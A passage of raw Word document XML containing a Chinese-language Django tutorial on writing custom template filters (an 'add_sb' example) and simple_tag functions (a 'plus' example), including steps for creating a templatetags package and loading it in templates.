        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B14F46"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return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"{}_sb_{}"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>formart</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D01100E"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p>
    <w:p w14:paraId="09716A58"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555555"/>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filter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</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'sb'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069F76E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add_sb</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'aaa'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4218A7"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return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"{}_sb_{}"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>formart</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 xml:space="preserve">)     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A2F1B4"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4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用自定义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A90C211"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981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>load</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>myfilters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kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40139D7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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>add_sb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'xxx'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C15FF4" w14:textId="0E71D561"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              {{ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>sb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'xxx'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528AF891" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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simple_tag:{% simple_tag函数名 参数1 参数2 %} 1.可以传多个参数,没有限制 2.不能与if标签来连用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14613EE3"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>例子：自定义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>simpletag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4A2BF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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B6DEBB"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1</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app01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中创建一个名字是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>templatetags</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的包，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A421502"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、在包中创建一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A155C1E"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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件中导入</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1600E64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from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E0E56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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>register</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Library</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBDAA15"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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、写函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB0B036"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555555"/>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simple_tag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</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"plus"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8259B1"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plus</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE3954B"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770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'{}+{}+{}'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>format</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269DD928"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116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、加装饰器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>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simple_tag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</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"plus"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E840E8D" w14:textId="77777777" w:rsidR="00D8288D"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E11FAE6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="004C0E9E"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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>     </w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、导入</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183B544A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="004C0E9E"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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>          {</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>%</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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>load</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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>mytag</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981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA13694" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="004C0E9E"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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>     </w:t>
      </w:r>
      <w:r w:rsidRPr="004C0E9E">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:i/>
          <w:iCs/>
